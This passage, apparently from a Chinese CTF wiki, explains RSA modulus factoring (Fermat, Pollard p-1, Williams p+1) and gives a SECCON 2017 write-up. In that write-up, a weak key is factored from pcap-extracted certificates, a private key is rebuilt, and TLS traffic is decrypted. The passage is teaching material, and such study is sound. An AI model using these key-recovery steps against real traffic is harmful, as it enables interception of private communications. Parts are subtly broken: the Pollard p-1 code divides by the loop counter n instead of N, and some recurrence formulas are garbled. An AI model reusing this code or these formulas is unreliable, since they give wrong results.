\u76f8\u8fd1\u3002\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u65b9\u6cd5\u6765\u5206\u89e3 \u987a\u5e8f\u68c0\u67e5 \\sqrt{n} \\sqrt{n} \u7684\u6bcf\u4e00\u4e2a\u6574\u6570 x\uff0c\u76f4\u5230\u627e\u5230\u4e00\u4e2a x \u4f7f\u5f97 x^2-n x^2-n \u662f\u5e73\u65b9\u6570\uff0c\u8bb0\u4e3a y^2 y^2 \u90a3\u4e48 x^2-n=y^2 x^2-n=y^2 \uff0c\u8fdb\u800c\u6839\u636e\u5e73\u65b9\u5dee\u516c\u5f0f\u5373\u53ef\u5206\u89e3 N p - 1 \u5149\u6ed1 \u00b6 \u5149\u6ed1\u6570(Smooth number)\uff1a\u6307\u53ef\u4ee5\u5206\u89e3\u4e3a\u5c0f\u7d20\u6570\u4e58\u79ef\u7684\u6b63\u6574\u6570 \u5f53 p p \u662f N N \u7684\u56e0\u6570\uff0c\u5e76\u4e14 p-1 p-1 \u662f\u5149\u6ed1\u6570\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 Pollard's p-1 \u7b97\u6cd5\u6765\u5206\u89e3 N N \u6839\u636e\u8d39\u9a6c\u5c0f\u5b9a\u7406\u6709 \u82e5p\\nmid a,\\ \u5219a^{p-1}\\equiv 1\\pmod{p} \u82e5p\\nmid a,\\ \u5219a^{p-1}\\equiv 1\\pmod{p} \u5219\u6709 a^{t(p-1)}\\equiv 1^t \\equiv 1\\pmod{p} a^{t(p-1)}\\equiv 1^t \\equiv 1\\pmod{p} \u5373 a^{t(p-1)} - 1 = k*p a^{t(p-1)} - 1 = k*p \u6839\u636e Pollard's p-1 \u7b97\u6cd5\uff1a \u5982\u679c p p \u662f\u4e00\u4e2a B-smooth\\ number B-smooth\\ number \uff0c\u90a3\u4e48\u5219\u5b58\u5728 M = \\prod_{q\\le{B}}{q^{\\lfloor\\log_q{B}\\rfloor}} M = \\prod_{q\\le{B}}{q^{\\lfloor\\log_q{B}\\rfloor}} \u4f7f\u5f97 (p-1)\\mid M (p-1)\\mid M \u6210\u7acb\uff0c\u5219\u6709 \\gcd{(a^{M}-1, N)} \\gcd{(a^{M}-1, N)} \u5982\u679c\u7ed3\u679c\u4e0d\u4e3a 1 1 \u6216 N N \uff0c\u90a3\u4e48\u5c31\u5df2\u6210\u529f\u5206\u89e3 N N \u3002 \u56e0\u4e3a\u6211\u4eec\u53ea\u5173\u5fc3\u6700\u540e\u7684gcd\u7ed3\u679c\uff0c\u540c\u65f6 N \u53ea\u5305\u542b\u4e24\u4e2a\u7d20\u56e0\u5b50\uff0c\u5219\u6211\u4eec\u4e0d\u9700\u8981\u8ba1\u7b97 M M \uff0c\u8003\u8651 n=2,3,\\dots n=2,3,\\dots \uff0c\u4ee4 M = n! M = n! \u5373\u53ef\u8986\u76d6\u6b63\u786e\u7684 M M \u540c\u65f6\u65b9\u4fbf\u8ba1\u7b97\u3002 \u5728\u5177\u4f53\u8ba1\u7b97\u4e2d\uff0c\u53ef\u4ee5\u4ee3\u5165\u964d\u5e42\u8fdb\u884c\u8ba1\u7b97 a^{n!}\\bmod{N}=\\begin{cases} (a\\bmod{N})^2\\mod{N}&n=2\\\\ (a^{(n-1)!}\\bmod{N})^n\\mod{N}&n\\ge{3} \\end{cases} a^{n!}\\bmod{N}=\\begin{cases} (a\\bmod{N})^2\\mod{N}&n=2\\\\ (a^{(n-1)!}\\bmod{N})^n\\mod{N}&n\\ge{3} \\end{cases} Python\u4ee3\u7801\u5b9e\u73b0 from gmpy2 import * a = 2 n = 2 while True : a = powmod ( a , n , N ) res = gcd ( a - 1 , N ) if res != 1 and res != N : q = n // res d = invert ( e , ( res - 1 ) * ( q - 1 )) m = powmod ( c , d , N ) print ( m ) break n += 1 p + 1 \u5149\u6ed1 \u00b6 \u5f53 p p \u662f N N \u7684\u56e0\u6570\uff0c\u5e76\u4e14 p+1 p+1 \u662f\u5149\u6ed1\u6570\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 Williams's p+1 \u7b97\u6cd5\u6765\u5206\u89e3 N N \u5df2\u77e5 N N \u7684\u56e0\u6570 p p \uff0c\u4e14 p+1 p+1 \u662f\u4e00\u4e2a\u5149\u6ed1\u6570 p = \\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)+1 p = \\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)+1 q_i q_i \u5373\u7b2c i i \u4e2a\u7d20\u56e0\u6570\u4e14\u6709 q_i^{\\alpha_i}\\le B_1 q_i^{\\alpha_i}\\le B_1 , \u627e\u5230 \\beta_i \\beta_i \u4f7f\u5f97\u8ba9 q_i^{\\beta_i}\\le B_1 q_i^{\\beta_i}\\le B_1 \u4e14 q_i^{\\beta_i+1}> B_1 q_i^{\\beta_i+1}> B_1 \uff0c\u7136\u540e\u4ee4 R = \\prod_{i=1}^k{q_i^{\\beta_i}} R = \\prod_{i=1}^k{q_i^{\\beta_i}} \u663e\u7136\u6709 p-1\\mid R p-1\\mid R \u4e14\u5f53 (N, a) = 1 (N, a) = 1 \u65f6\u6709 a^{p-1}\\equiv 1 \\pmod{p} a^{p-1}\\equiv 1 \\pmod{p} \uff0c\u6240\u4ee5\u6709 a^R\\equiv 1\\pmod{p} a^R\\equiv 1\\pmod{p} \uff0c\u5373 p\\mid(N, a^R-1) p\\mid(N, a^R-1) \u4ee4 P,Q P,Q \u4e3a\u6574\u6570\uff0c \\alpha,\\beta \\alpha,\\beta \u4e3a\u65b9\u7a0b x^2-Px+Q=0 x^2-Px+Q=0 \u7684\u6839\uff0c\u5b9a\u4e49\u5982\u4e0b\u7c7b\u5362\u5361\u65af\u5e8f\u5217 \\begin{aligned} U_n(P, Q) &= (\\alpha^n -\\beta^n)/(\\alpha - \\beta)\\\\ V_n(P, Q) &= \\alpha^n + \\beta^n \\end{aligned} \\begin{aligned} U_n(P, Q) &= (\\alpha^n -\\beta^n)/(\\alpha - \\beta)\\\\ V_n(P, Q) &= \\alpha^n + \\beta^n \\end{aligned} \u540c\u6837\u6709 \\Delta = (\\alpha - \\beta)^2 = P^2-4Q \\Delta = (\\alpha - \\beta)^2 = P^2-4Q \uff0c\u5219\u6709 \\begin{cases} U_{n+1} &= PU_n - QU_{n-1}\\\\ V_{n+1} &= PV_n - QV_{n-1} \\end{cases}\\tag{2.2} \\begin{cases} U_{n+1} &= PU_n - QU_{n-1}\\\\ V_{n+1} &= PV_n - QV_{n-1} \\end{cases}\\tag{2.2} \\begin{cases} U_{2n} &= V_nU_n\\\\ V_{2n} &= V_n^2 - 2Q^n \\end{cases}\\tag{2.3} \\begin{cases} U_{2n} &= V_nU_n\\\\ V_{2n} &= V_n^2 - 2Q^n \\end{cases}\\tag{2.3} \\begin{cases} U_{2n-1} &= U_n^2 - QU_{n-1}^2\\\\ V_{2n-1} &= V_nV_{n-1} - PQ^{n-1} \\end{cases}\\tag{2.4} \\begin{cases} U_{2n-1} &= U_n^2 - QU_{n-1}^2\\\\ V_{2n-1} &= V_nV_{n-1} - PQ^{n-1} \\end{cases}\\tag{2.4} \\begin{cases} \\Delta U_{n} &= PV_n - 2QV_{n-1}\\\\ V_{n} &= PU_n - 2QU_{n-1} \\end{cases}\\tag{2.5} \\begin{cases} \\Delta U_{n} &= PV_n - 2QV_{n-1}\\\\ V_{n} &= PU_n - 2QU_{n-1} \\end{cases}\\tag{2.5} \\begin{cases} U_{m+n} &= U_mU_{n+1} - QU_{m-1}U_n\\\\ \\Delta U_{m+n} &= V_mV_{n+1} - QV_{m-1}V_n \\end{cases}\\tag{2.6} \\begin{cases} U_{m+n} &= U_mU_{n+1} - QU_{m-1}U_n\\\\ \\Delta U_{m+n} &= V_mV_{n+1} - QV_{m-1}V_n \\end{cases}\\tag{2.6} \\begin{cases} U_{n}(V_k(P, Q), Q^k) &= U_{nk}(P, Q)/U_k(P, Q)\\\\ V_{n}(V_k(P, Q), Q^k) &= V_n(P, Q) \\end{cases}\\tag{2.7} \\begin{cases} U_{n}(V_k(P, Q), Q^k) &= U_{nk}(P, Q)/U_k(P, Q)\\\\ V_{n}(V_k(P, Q), Q^k) &= V_n(P, Q) \\end{cases}\\tag{2.7} \u540c\u65f6\u6211\u4eec\u6709\u5982\u679c (N, Q) = 1 (N, Q) = 1 \u4e14 P^{'}Q\\equiv P^2-2Q\\pmod{N} P^{'}Q\\equiv P^2-2Q\\pmod{N} \uff0c\u5219\u6709 P^{'}\\equiv \\alpha/\\beta + \\beta/\\alpha P^{'}\\equiv \\alpha/\\beta + \\beta/\\alpha \u4ee5\u53ca Q^{'}\\equiv \\alpha/\\beta + \\beta/\\alpha = 1 Q^{'}\\equiv \\alpha/\\beta + \\beta/\\alpha = 1 \uff0c\u5373 U_{2m}(P, Q)\\equiv PQ^{m-1}U_m(P^{'}, 1)\\pmod{N}\\tag{2.8} U_{2m}(P, Q)\\equiv PQ^{m-1}U_m(P^{'}, 1)\\pmod{N}\\tag{2.8} \u6839\u636e\u6269\u5c55\u5362\u5361\u65af\u5b9a\u7406 \u5982\u679cp\u662f\u5947\u7d20\u6570\uff0c p\\nmid Q p\\nmid Q \u4e14\u52d2\u8ba9\u5fb7\u7b26\u53f7 (\\Delta/p) = \\epsilon (\\Delta/p) = \\epsilon \uff0c\u5219 \\begin{aligned} U_{(p-\\epsilon)m}(P, Q) &\\equiv 0\\pmod{p}\\\\ V_{(p-\\epsilon)m}(P, Q) &\\equiv 2Q^{m(1-\\epsilon)/2}\\pmod{p} \\end{aligned} \\begin{aligned} U_{(p-\\epsilon)m}(P, Q) &\\equiv 0\\pmod{p}\\\\ V_{(p-\\epsilon)m}(P, Q) &\\equiv 2Q^{m(1-\\epsilon)/2}\\pmod{p} \\end{aligned} \u7b2c\u4e00\u79cd\u60c5\u51b5 \uff1a\u5df2\u77e5N\u7684\u56e0\u6570p\uff0c\u4e14p+1\u662f\u4e00\u4e2a\u5149\u6ed1\u6570 p = \\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)-1 p = \\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)-1 \u6709 p+1\\mid R p+1\\mid R \uff0c\u5f53 (Q, N)=1 (Q, N)=1 \u4e14 (\\Delta/p) = -1 (\\Delta/p) = -1 \u65f6\u6709 p\\mid U_R(P, Q) p\\mid U_R(P, Q) \uff0c\u5373 p\\mid (U_R(P, Q), N) p\\mid (U_R(P, Q), N) \u4e3a\u4e86\u627e\u5230 U_R(P, Q) U_R(P, Q) \uff0c Guy \u548c Conway \u63d0\u51fa\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u516c\u5f0f \\begin{aligned} U_{2n-1} &= U_n^2 - QU_n^2 - 1\\\\ U_{2n} &= U_n(PU_n - 2QU_{n-1})\\\\ U_{2n+1} &= PU_{2n} - QU_{2n-1} \\end{aligned} \\begin{aligned} U_{2n-1} &= U_n^2 - QU_n^2 - 1\\\\ U_{2n} &= U_n(PU_n - 2QU_{n-1})\\\\ U_{2n+1} &= PU_{2n} - QU_{2n-1} \\end{aligned} \u4f46\u662f\u4e0a\u8ff0\u516c\u5f0f\u503c\u592a\u5927\u4e86\uff0c\u4e0d\u4fbf\u8fd0\u7b97\uff0c\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u5982\u4e0b\u65b9\u6cd5 \u5982\u679c p \\mid U_R(P, 1) p \\mid U_R(P, 1) \uff0c\u6839\u636e \u516c\u5f0f2.3 \u6709 p\\mid U_{2R}(P, Q) p\\mid U_{2R}(P, Q) \uff0c\u6240\u4ee5\u6839\u636e \u516c\u5f0f2.8 \u6709 p \\mid U_R(P^{'}, 1) p \\mid U_R(P^{'}, 1) \uff0c\u8bbe Q=1 Q=1 \uff0c\u5219\u6709 V_{(p-\\epsilon)m}(P, 1) \\equiv 2\\pmod{p} V_{(p-\\epsilon)m}(P, 1) \\equiv 2\\pmod{p} \u5373\uff0c\u5982\u679c p\\mid U_R(P, 1) p\\mid U_R(P, 1) \uff0c\u5219 p\\mid(V_R(P, 1) -2) p\\mid(V_R(P, 1) -2) . \u7b2c\u4e00\u79cd\u60c5\u51b5\u53ef\u4ee5\u5f52\u7eb3\u4e3a\uff1a \u8ba9 R = r_1r_2r_3\\cdots r_m R = r_1r_2r_3\\cdots r_m \uff0c\u540c\u65f6\u627e\u5230 P_0 P_0 \u4f7f\u5f97 (P_0^2-4, N) = 1 (P_0^2-4, N) = 1 \uff0c\u5b9a\u4e49 V_n(P) = V_n(P, 1), U_n(P) = U_n(P, 1) V_n(P) = V_n(P, 1), U_n(P) = U_n(P, 1) \u4e14 P_j \\equiv V_{r_j}(P_{j-1})\\pmod{N}(j = 1,2,3,\\dots,m) P_j \\equiv V_{r_j}(P_{j-1})\\pmod{N}(j = 1,2,3,\\dots,m) \u6839\u636e \u516c\u5f0f2.7 \uff0c\u6709 P_m \\equiv V_R(P_0)\\pmod{N}\\tag{3.1} P_m \\equiv V_R(P_0)\\pmod{N}\\tag{3.1} \u8981\u8ba1\u7b97 V_r = V_r(P) V_r = V_r(P) \u53ef\u4ee5\u7528\u5982\u4e0b\u516c\u5f0f \u6839\u636e \u516c\u5f0f2.2 \uff0c \u516c\u5f0f2.3 \uff0c \u516c\u5f0f2.4 \u6709 \\begin{cases} V_{2f-1}&\\equiv V_fV_{f-1}-P\\\\ V_{2f}&\\equiv V_f^2 - 2\\\\ V_{2f+1}&\\equiv PV_f^2-V_fV_{f-1}-P\\pmod(N) \\end{cases} \\begin{cases} V_{2f-1}&\\equiv V_fV_{f-1}-P\\\\ V_{2f}&\\equiv V_f^2 - 2\\\\ V_{2f+1}&\\equiv PV_f^2-V_fV_{f-1}-P\\pmod(N) \\end{cases} \u4ee4 r = \\sum_{i=0}^t{b_t2^{t-i}}\\ \\ \\ \\ (b_i=0,1) r = \\sum_{i=0}^t{b_t2^{t-i}}\\ \\ \\ \\ (b_i=0,1) f_0=1, f_{k+1}=2f_k+b_{k+1} f_0=1, f_{k+1}=2f_k+b_{k+1} \uff0c\u5219 f_t=r f_t=r \uff0c\u540c\u6837 V_0(P) = 2, V_1(P) = P V_0(P) = 2, V_1(P) = P \uff0c\u5219\u6700\u7ec8\u516c\u5f0f\u4e3a (V_{f_{k+1}}, V_{f_{k+1}-1}) = \\begin{cases} (V_{2f_k}, V_{2f_k-1})\\ \\ \\ \\ if\\ b_{k+1}=0\\\\ (V_{2f_k+1}, V_{2f_k})\\ \\ \\ \\ if\\ b_{k+1}=1 \\end{cases} (V_{f_{k+1}}, V_{f_{k+1}-1}) = \\begin{cases} (V_{2f_k}, V_{2f_k-1})\\ \\ \\ \\ if\\ b_{k+1}=0\\\\ (V_{2f_k+1}, V_{2f_k})\\ \\ \\ \\ if\\ b_{k+1}=1 \\end{cases} \u7b2c\u4e8c\u79cd\u60c5\u51b5 \uff1a\u5df2\u77e5p+1\u662f\u4e00\u4e2a\u5149\u6ed1\u6570 p = s\\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)-1 p = s\\left(\\prod_{i=1}^k{q_i^{\\alpha_i}}\\right)-1 \u5f53 s s \u662f\u7d20\u6570\uff0c\u4e14 B_1<s\\le B_2 B_1<s\\le B_2 \uff0c\u6709 p\\mid(a_m^s-1, N)\uff0c p\\mid(a_m^s-1, N)\uff0c \u5b9a\u4e49 s_j s_j \u548c 2d_j 2d_j 2d_j = s_j+1-s_j 2d_j = s_j+1-s_j \u5982\u679c (\\Delta/p) = -1 (\\Delta/p) = -1 \u4e14 p\\nmid P_m-2 p\\nmid P_m-2 \uff0c\u5219\u6839\u636e \u516c\u5f0f2.7 \u548c \u516c\u5f0f3.1 \u6709 p\\mid(U_s(P_m), N) p\\mid(U_s(P_m), N) \u3002 \u4ee4 U[n] \\equiv U_n(P_m), V[n]\\equiv V_n(P_m)\\pmod{N} U[n] \\equiv U_n(P_m), V[n]\\equiv V_n(P_m)\\pmod{N} \uff0c\u8ba1\u7b97 U[2d_j-1], U[2d_j], U[2d_j+1] U[2d_j-1], U[2d_j], U[2d_j+1] \u901a\u8fc7 U[0] = 0, U[1] = 1, U[n+1] = P_mU[n] - U[n-1] U[0] = 0, U[1] = 1, U[n+1] = P_mU[n] - U[n-1] \u8ba1\u7b97 T[s_i] \\equiv \\Delta U_{s_i}(P_m) = \\Delta U_{s_iR}(P_0)/U_R(P_0)\\pmod{N} T[s_i] \\equiv \\Delta U_{s_i}(P_m) = \\Delta U_{s_iR}(P_0)/U_R(P_0)\\pmod{N} \u901a\u8fc7 \u516c\u5f0f2.6 \uff0c \u516c\u5f0f2.7 \u548c \u516c\u5f0f3.1 \u6709 \\begin{cases} T[s_1]&\\equiv P_mV[s_1]-2V[s_1-1]\\\\ T[s_1-1]&\\equiv 2V[s_1]-P_mV[s_1-1]\\pmod{N} \\end{cases} \\begin{cases} T[s_1]&\\equiv P_mV[s_1]-2V[s_1-1]\\\\ T[s_1-1]&\\equiv 2V[s_1]-P_mV[s_1-1]\\pmod{N} \\end{cases} \u5373 \\begin{cases} T[s_{i+1}]&\\equiv T[s_i]U[2d_i+1]-T[s_i-1]U[2d_i]\\\\ T[s_{i+1}-1]&\\equiv T[s_i]U[2d_i]-T[s_i-1]U[2d_i-1]\\pmod{N} \\end{cases} \\begin{cases} T[s_{i+1}]&\\equiv T[s_i]U[2d_i+1]-T[s_i-1]U[2d_i]\\\\ T[s_{i+1}-1]&\\equiv T[s_i]U[2d_i]-T[s_i-1]U[2d_i-1]\\pmod{N} \\end{cases} \u8ba1\u7b97 T[s_i], i=1,2,3\\dots T[s_i], i=1,2,3\\dots \uff0c\u7136\u540e\u8ba1\u7b97 H_t = (\\prod_{i=0}^c{T[s_{i+t}], N}) H_t = (\\prod_{i=0}^c{T[s_{i+t}], N}) \u5176\u4e2d t = 1, c+1, 2c+1, \\dots, c[B_2/c]+1 t = 1, c+1, 2c+1, \\dots, c[B_2/c]+1 \uff0c\u6211\u4eec\u6709 p\\mid H_i p\\mid H_i \u5f53 (\\Delta/p)=-1 (\\Delta/p)=-1 python\u4ee3\u7801\u5b9e\u73b0 def mlucas ( v , a , n ): \"\"\" Helper function for williams_pp1(). Multiplies along a Lucas sequence modulo n. \"\"\" v1 , v2 = v , ( v ** 2 - 2 ) % n for bit in bin ( a )[ 3 :]: v1 , v2 = (( v1 ** 2 - 2 ) % n , ( v1 * v2 - v ) % n ) if bit == \"0\" else (( v1 * v2 - v ) % n , ( v2 ** 2 - 2 ) % n ) return v1 for v in count ( 1 ): for p in primegen (): e = ilog ( isqrt ( n ), p ) if e == 0 : break for _ in xrange ( e ): v = mlucas ( v , p , n ) g = gcd ( v - 2 , n ) if 1 < g < n : return g # g|n if g == n : break 2017 SECCON very smooth \u00b6 \u8be5\u7a0b\u5e8f\u7ed9\u4e86\u4e00\u4e2a HTTPS \u52a0\u5bc6\u7684\u6d41\u91cf\u5305\uff0c\u9996\u5148\u4ece\u5176\u4e2d\u62ff\u5230\u8bc1\u4e66 \u279c 2017_SECCON_verysmooth git: ( master ) binwalk -e s.pcap DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 2292 0x8F4 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 4038 0xFC6 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 5541 0x15A5 Certificate in DER format ( x509 v3 ) , header length: 4 , sequence length: 467 \u279c 2017_SECCON_verysmooth git: ( master ) ls s.pcap _s.pcap.extracted very_smooth.zip \u8fd9\u91cc\u5206\u522b\u67e5\u770b\u4e09\u4e2a\u8bc1\u4e66\uff0c\u4e09\u4e2a\u6a21\u6570\u90fd\u4e00\u6837\uff0c\u8fd9\u91cc\u53ea\u7ed9\u4e00\u4e2a\u4f8b\u5b50 \u279c _s.pcap.extracted git:(master) openssl x509 -inform DER -in FC6.crt -pubkey -text -modulus -noout -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy 8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYj DUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQl yioxCqbXYIMxGO4NcQIDAQAB -----END PUBLIC KEY----- Certificate: Data: Version: 1 (0x0) Serial Number: 11640506567126718943 (0xa18b630c7b3099df) Signature Algorithm: sha256WithRSAEncryption Issuer: C=JP, ST=Kawasaki, O=SRL Validity Not Before: Oct 8 02:47:17 2017 GMT Not After : Oct 8 02:47:17 2018 GMT Subject: C=JP, ST=Kawasaki, O=SRL Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (1024 bit) Modulus: 00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe: 48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0: c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12: 75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e: 69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0: 2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07: 47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89: 19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a: a6:d7:60:83:31:18:ee:0d:71 Exponent: 65537 (0x10001) Signature Algorithm: sha256WithRSAEncryption 78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf: 62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3: 32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46: f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c: 6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96: bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05: e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32: b7:39 Modulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71 \u53ef\u4ee5\u770b\u51fa\u6a21\u6570\u53ea\u6709 1024 \u6bd4\u7279\u3002\u800c\u4e14\uff0c\u6839\u636e\u9898\u76ee\u540d very smooth\uff0c\u5e94\u8be5\u662f\u5176\u4e2d\u4e00\u4e2a\u56e0\u5b50\u6bd4\u8f83 smooth\uff0c\u8fd9\u91cc\u6211\u4eec\u5229\u7528 primefac \u5206\u522b\u5c1d\u8bd5 Pollard's p \u2212 1 \u4e0e Williams's p + 1 \u7b97\u6cd5\uff0c\u5982\u4e0b \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs -m = p+1 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 : p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 Z309 = P155 x P155 = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 \u53ef\u4ee5\u53d1\u73b0\u5f53\u4f7f\u7528 Williams's p + 1 \u7b97\u6cd5\u65f6\uff0c\u5c31\u76f4\u63a5\u5206\u89e3\u51fa\u6765\u4e86\u3002\u6309\u9053\u7406\u8fd9\u4e2a\u56e0\u5b50\u662f p-1 \u4f3c\u4e4e\u66f4\u5149\u6ed1\uff0c\u4f46\u662f\u5374\u5e76\u4e0d\u80fd\u4f7f\u7528 Pollard's p \u2212 1 \u7b97\u6cd5\u5206\u89e3\uff0c\u8fd9\u91cc\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u6d4b\u8bd5 \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002 : 2 7 43 503 761429 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823 Z154 = P1 x P1 x P2 x P3 x P6 x P142 = 2 x 7 x 43 x 503 x 761429 x 5121103123294685745276806480148867612214394022184063853387799606010231770631857868979139305712805242051823263337587909550709296150544706624823 \u279c _s.pcap.extracted git: ( master ) python -m primefac -vs 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 1180748523162913202560299132400715036690822975250801623040000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 : 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 2 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 3 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 5 Z154 = P1^185 x P1^62 x P1^97 = 2 ^185 x 3 ^62 x 5 ^97 \u53ef\u4ee5\u770b\u51fa\uff0c\u5bf9\u4e8e p-1 \u786e\u5b9e\u6709\u5f88\u591a\u5c0f\u56e0\u5b50\uff0c\u4f46\u662f\u4e2a\u6570\u592a\u591a\uff0c\u8fd9\u5c31\u4f1a\u4f7f\u5f97\u8fdb\u884c\u679a\u4e3e\u7684\u65f6\u5019\u51fa\u73b0\u6307\u6570\u7206\u70b8\u7684\u60c5\u51b5\uff0c\u56e0\u6b64\u6ca1\u6709\u5206\u89e3\u51fa\u6765\u3002 \u8fdb\u800c\u6839\u636e\u5206\u89e3\u51fa\u6765\u7684\u6570\u6784\u9020\u79c1\u94a5 from Crypto.PublicKey import RSA import gmpy2 def main (): n = 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 L p = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 L q = 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 L e = 65537 L priv = RSA . construct (( n , e , long ( gmpy2 . invert ( e , ( p - 1 ) * ( q - 1 ))))) open ( 'private.pem' , 'w' ) . write ( priv . exportKey ( 'PEM' )) main () \u6700\u540e\uff0c\u5c06\u79c1\u94a5\u5bfc\u5165\u5230 wireshark \u4e2d\u5373\u53ef\u5f97\u5230\u660e\u6587\uff08Edit -> Preferences -> Protocols -> SSL -> RSA Key List\uff09\u3002 < html > < head >< title > Very smooth </ title ></ head > < body > < h1 > Answer: One of these primes is very smooth. </ h1 > </ body > </ html > \u6269\u5c55 \u00b6 \u5173\u4e8e\u66f4\u591a\u7684\u4e00\u4e9b\u5206\u89e3\u6a21\u6570 N \u7684\u65b9\u6cd5\u53ef\u4ee5\u53c2\u8003 https://en.wikipedia.org/wiki/Integer_factorization \u3002 \u6a21\u4e0d\u4e92\u7d20 \u00b6 \u653b\u51fb\u539f\u7406 \u00b6 \u5f53\u5b58\u5728\u4e24\u4e2a\u516c\u94a5\u7684 N \u4e0d\u4e92\u7d20\u65f6\uff0c\u6211\u4eec\u663e\u7136\u53ef\u4ee5\u76f4\u63a5\u5bf9\u8fd9\u4e24\u4e2a\u6570\u6c42\u6700\u5927\u516c\u56e0\u6570\uff0c\u7136\u540e\u76f4\u63a5\u83b7\u5f97 p\uff0cq\uff0c\u8fdb\u800c\u83b7\u5f97\u76f8\u5e94\u7684\u79c1\u94a5\u3002 SCTF RSA2 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF rsa2 